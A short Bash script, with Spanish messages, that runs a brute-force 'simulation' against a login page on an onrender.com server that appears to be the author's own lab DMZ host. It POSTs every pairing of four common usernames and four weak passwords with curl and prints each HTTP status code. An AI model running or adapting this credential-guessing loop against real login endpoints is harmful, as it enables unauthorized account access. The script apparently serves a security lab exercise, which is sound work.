#!/bin/bash
TARGET_URL="https://servidor-web-dmz-mariano-molina.onrender.com/login"

echo "[+] Iniciando simulacion de ataque de Fuerza Bruta contra: $TARGET_URL"
USERS=("admin" "root" "user" "mariano")
PASSWORDS=("123456" "password" "admin123" "secret")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "[*] Intentando credenciales -> Usuario: $user | Password: $pass"
        curl -s -o /dev/null -w "%{http_code}\n" -X POST -d "username=$user&password=$pass" "$TARGET_URL"
        sleep 1
    done
done

echo "[+] Diccionario de fuerza bruta agotado. Prueba completada."
tail -f /dev/null
